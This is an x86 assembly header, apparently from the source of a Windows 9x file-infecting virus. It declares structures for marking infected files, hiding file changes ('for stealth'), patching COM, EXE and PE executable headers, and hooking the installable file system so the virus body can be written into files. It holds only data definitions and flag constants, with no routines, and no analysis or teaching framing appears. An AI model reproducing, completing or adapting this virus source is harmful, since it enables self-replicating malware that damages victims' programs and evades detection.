   include         filehead.inc
   include         ifs.inc
   include         ifsext.inc

   ; for stealth
   st      struc
     st_size dw    ?       ; data size (zero if last item)
     st_pt   dd    ?       ; file point
   st      ends

   ; common host data
   cmn_ht  struc
     InfectedSign  dd      ?
     FileSize      dd      ?
     eh_st         st      ?
     eh         exe_header ?
   cmn_ht  ends

   ; for com & exe
   ce      struc
     ce_cmn_ht     cmn_ht  ?
     ce_last       dw      ?
   ce      ends

   ; for pe (portable executable)
   pe      struc
     pe_cmn_ht     cmn_ht  ?
     pe_inhs_st    st      ?
     pe_inhs       IMAGE_NT_HEADERS ?
     pe_ish_st     st      ?
     pe_ish        IMAGE_SECTION_HEADER ?
     pe_last       dw      ?
   pe      ends

   ; combine each file format
   host_data union
     ce_hdat ce    ?
     pe_hdat pe    ?
   host_data ends


   ifshp   struc
     hdat          host_data ?
     FileAttributes dd     ?
     FileDateTime  dd      ?
     our_ifsreq    ifsreq  ?
     our_hfunc     hndlfunc ?
     PathNameSize  dd      ?
     szPathName    db      MAX_PATH dup(?)
     UniPath       db      1024 dup(?)
     VirData       db      vir_file_size dup(?)
   ifshp   ends


   ; for pushfd & pushad
   pfad    struc
     pfad_edi      dd      ?
     pfad_esi      dd      ?
     pfad_ebp      dd      ?
     pfad_esp      dd      ?
     pfad_ebx      dd      ?
     pfad_edx      dd      ?
     pfad_ecx      dd      ?
     pfad_eax      dd      ?
     pfad_eflags   dd      ?
     pfad_ret      dd      ?
   pfad    ends

   CFbit   equ     0000000000000001b
   PFbit   equ     0000000000000100b
   AFbit   equ     0000000000010000b
   ZFbit   equ     0000000001000000b
   SFbit   equ     0000000010000000b
   TFbit   equ     0000000100000000b
   IFbit   equ     0000001000000000b
   DFbit   equ     0000010000000000b
   OFbit   equ     0000100000000000b
   IOPLbits equ    0011000000000000b
   NTbit   equ     0100000000000000b

   RFbit   equ     (1b      shl    16)
   VMbit   equ     (10b     shl    16)
   ACbit   equ     (100b    shl    16)
   VIFbit  equ     (1000b   shl    16)
   VIPbit  equ     (10000b  shl    16)
   IDbit   equ     (100000b shl    16)
